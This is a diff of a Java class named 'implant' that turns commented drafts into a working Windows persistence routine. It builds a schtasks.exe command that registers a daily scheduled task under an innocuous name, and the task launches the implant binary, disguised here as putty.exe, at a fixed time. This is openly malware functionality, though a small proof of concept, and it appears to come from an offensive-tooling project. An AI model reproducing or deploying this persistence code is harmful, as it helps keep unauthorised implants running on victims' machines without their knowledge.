@@ -176,65 +176,34 @@ public class implant {
          */
     }
 
+     //This function creates a task scheduler on a windows device to start the implant daily
     public static void POCPersistenceWindows() {
-        // DONE: check for persistence before establishing
+        try{
+          List<String> commands = new ArrayList<String>();
+          commands.add("schtasks.exe");
+          commands.add("/CREATE");
+          commands.add("/SC");
+          commands.add("DAILY");
+          commands.add("/TN");
+          commands.add("AABBB");
+          commands.add("/TR");
+          //NOTE: This part needs to be replaced with the path to the implant!!
+          commands.add("C:/Users/cornd/OneDrive/Desktop/putty.exe");
+          commands.add("/ST");
+          //change this if you want to change what time it starts at (current 9:42pm)
+          commands.add("21:42");
+          
+          ProcessBuilder builder = new ProcessBuilder(commands);
+          Process p = builder.start();
 
-        // Get-ScheduledTask -TaskName "Aosososososo"
-        /*
-         * try{
-         * /was only able to make this work by having it be an array of strings
-         * List<String> commands = new ArrayList<String>();
-         * //First we add the command Get-ScheduledTask
-         * commands.add("Get-ScheduledTask");
-         * //now we add the task name to check for
-         * commands.add("-TaskName");
-         * commands.add("Aosososososo");
-         * ProcessBuilder builder = new ProcessBuilder(commands);
-         * Process p = builder.start();
-         * p.waitFor();
-         * System.out.println(p.exitValue());
-         * }
-         * catch(Exception e){
-         * System.out.println("o no");
-         * }
-         */
-        // DONE: establish persistence:
-        /*
-         * try{
-         * /was only able to make this work by having it be an array of strings
-         * List<String> commands = new ArrayList<String>();
-         * /this ugly part is the physical act of adding commands to be executed in a
-         * cmd terminal, in this case
-         * //specifically creating a task scheduler event.
-         * commands.add("schtasks.exe");
-         * commands.add("/CREATE");
-         * //this controls how often the task occurs, change this to
-         * Daily/weekly/monthly as needed
-         * commands.add("/SC");
-         * commands.add("DAILY");
-         * //this is just the name of the task
-         * commands.add("/TN");
-         * commands.add("Aosososososo");
-         * commands.add("/TR");
-         * //this will need to be changed to whatever our implants name/location is
-         * commands.add("C:/Users/cornd/OneDrive/Desktop/putty.exe");
-         * //this is the start time, change it to when we want it to start daily
-         * commands.add("/ST");
-         * commands.add("21:42");
-         * ProcessBuilder builder = new ProcessBuilder(commands);
-         * Process p = builder.start();
-         * p.waitFor();
-         * System.out.println(p.exitValue());
-         * }
-         * catch(Exception e){
-         * System.out.println("o no");
-         * }
-         * }
-         * }
-         * 
-         */
+          p.waitFor();
+          System.out.println(p.exitValue());
+        }
+        catch(Exception e){
+          System.out.println("2"); 
+        }
     }
-
+    
     public static void EstablishPersistence() {
         // TODO: check for persistence before establishing
         /*
